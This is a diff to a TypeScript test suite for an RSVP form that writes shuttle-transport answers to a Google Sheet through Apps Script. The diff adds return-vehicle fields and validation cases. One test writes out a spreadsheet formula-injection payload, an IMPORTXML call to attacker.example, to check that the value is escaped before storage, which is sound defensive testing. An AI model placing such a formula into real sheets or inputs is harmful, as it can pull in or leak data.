@@ -174,15 +174,16 @@ describe("Direct RSVP → Google Apps Script", () => {
       outbound: "trip-1",
       station: " Công viên 30/4, Quận 1 ",
       vehicle: " Xe 16 chỗ ",
-      returnRide: "same",
+      returnRide: "shuttle",
+      returnVehicle: "Xe 1",
       returnStation: "Bến xe Miền Đông mới",
     };
     expect(google.post(body)).toMatchObject({ ok: true, version: 2, requestId: body.requestId });
     expect(google.rows[1]?.slice(7, 13)).toEqual([
-      "Dùng xe", "Chuyến 1", "Xe 16 chỗ", "Công viên 30/4, Quận 1", "Xe cũ", "Bến xe Miền Đông mới",
+      "Dùng xe", "Chuyến 1", "Xe 16 chỗ", "Công viên 30/4, Quận 1", "Xe 1", "Bến xe Miền Đông mới",
     ]);
     expect(JSON.parse(String(google.rows[1]?.[6]))).toMatchObject({
-      vehicle: "Xe 16 chỗ", station: "Công viên 30/4, Quận 1", returnStation: "Bến xe Miền Đông mới",
+      vehicle: "Xe 16 chỗ", station: "Công viên 30/4, Quận 1", returnVehicle: "Xe 1", returnStation: "Bến xe Miền Đông mới",
     });
     const renamed = {
       ...valid, requestId: crypto.randomUUID(), transport: "shuttle", outbound: "trip-2",
@@ -198,9 +199,14 @@ describe("Direct RSVP → Google Apps Script", () => {
       ...valid, requestId: crypto.randomUUID(), transport: "own",
     }).ok).toBe(true);
     expect(google.rows[4]?.slice(7, 13)).toEqual(["Tự sắp xếp", "", "", "", "", ""]);
+    expect(google.post({
+      ...valid, requestId: crypto.randomUUID(), transport: "shuttle", outbound: "none",
+      returnRide: "shuttle", returnVehicle: "Xe 2", returnStation: "Cổng KDL Suối Tiên",
+    }).ok).toBe(true);
+    expect(google.rows[5]?.slice(7, 13)).toEqual(["Dùng xe", "Không đi", "", "", "Xe 2", "Cổng KDL Suối Tiên"]);
     const formula = { ...body, requestId: crypto.randomUUID(), station: "=IMPORTXML(\"https://attacker.example\",\"//a\")" };
     expect(google.post(formula).ok).toBe(true);
-    expect(google.rows[5]?.[10]).toBe("'" + formula.station);
+    expect(google.rows[6]?.[10]).toBe("'" + formula.station);
   });
 
   test("extends an old RSVP header with the shuttle text columns", () => {
@@ -226,7 +232,8 @@ describe("Direct RSVP → Google Apps Script", () => {
     { transport: "shuttle", outbound: "none", returnRide: "same", returnStation: "Hàng Xanh" },
     { transport: "shuttle", outbound: "trip-1", station: "Suối Tiên", returnRide: "bus" },
     { transport: "shuttle", outbound: "self", vehicle: "Xe 1", returnRide: "self" },
-    { transport: "shuttle", outbound: "trip-1", vehicle: " ", station: "Suối Tiên", returnRide: "self" },
+    { transport: "shuttle", outbound: "none", returnRide: "shuttle", returnStation: "Hàng Xanh" },
+    { transport: "shuttle", outbound: "none", returnRide: "self", returnVehicle: "Xe 1" },
   ])("rejects a malformed shuttle answer before writing: %j", (fields) => {
     expect(google.post({ ...valid, requestId: crypto.randomUUID(), ...fields }).error).toBe("invalid_request");
     expect(google.rows).toHaveLength(0);
